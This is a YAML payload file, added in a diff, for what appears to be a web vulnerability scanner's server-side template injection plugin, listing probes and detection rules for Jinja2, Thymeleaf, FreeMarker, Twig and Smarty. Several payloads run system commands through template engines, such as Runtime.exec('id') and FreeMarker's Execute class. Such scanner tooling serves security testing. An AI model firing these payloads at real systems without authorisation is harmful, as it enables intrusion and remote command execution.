@@ -1,0 +1,116 @@
+# SSTI Payloads Database
+# Plugin: core.injection.ssti
+
+plugin_id: core.injection.ssti
+mutation_type: field_injection
+payload_type: ssti
+
+variants:
+  # Variant 1: Jinja2/Flask
+  - id: jinja2_basic
+    payloads:
+      - "{{7*7}}"
+      - "{{config}}"
+      - "{{''.__class__.__mro__[2].__subclasses__()}}"
+    expected_result: "49"  # Pour {{7*7}}
+    tech_stack: [python, flask, django]
+    confidence_boost: 0.18
+    detection: body_contains(expected_result)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+        - [url_encode, unicode_escape]
+      obfuscation: []  # SSTI pas d'obfuscation (syntaxe stricte)
+      max_combinations: 12
+
+  # Variant 2: Thymeleaf/Spring
+  - id: thymeleaf_basic
+    payloads:
+      - "${7*7}"
+      - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    expected_result: "49"
+    tech_stack: [java, spring]
+    confidence_boost: 0.20
+    detection: body_contains(expected_result) OR body_matches_any(uid=, gid=)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+      obfuscation: []
+      max_combinations: 10
+
+  # Variant 3: FreeMarker
+  - id: freemarker_basic
+    payloads:
+      - "#{7*7}"
+      - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+    expected_result: "49"
+    tech_stack: [java, freemarker]
+    confidence_boost: 0.18
+    detection: body_contains(expected_result) OR body_matches_any(uid=, root)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 8
+
+  # Variant 4: Twig (PHP)
+  - id: twig_basic
+    payloads:
+      - "{{7*7}}"
+      - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+    expected_result: "49"
+    tech_stack: [php, symfony]
+    confidence_boost: 0.17
+    detection: body_contains(expected_result)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+      obfuscation: []
+      max_combinations: 8
+
+  # Variant 5: Smarty (PHP)
+  - id: smarty_basic
+    payloads:
+      - "{7*7}"
+      - "{php}echo `id`;{/php}"
+    expected_result: "49"
+    tech_stack: [php]
+    confidence_boost: 0.15
+    detection: body_contains(expected_result) OR body_matches_any(uid=)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 6
+
+keywords:
+  - template
+  - view
+  - page
+  - render
+  - format
+  - layout
+  - theme
+  - skin
+  - widget
+  - content
+
+expected_results:
+  jinja2_basic:
+    indicator: template_eval
+    expected_output: "49"
+  thymeleaf_basic:
+    indicator: template_eval OR command_exec
+    expected_output: "49"
+  freemarker_basic:
+    indicator: template_eval OR command_exec
+    expected_output: "49"
+  twig_basic:
+    indicator: template_eval
+    expected_output: "49"
+  smarty_basic:
+    indicator: template_eval OR command_exec
+    expected_output: "49"
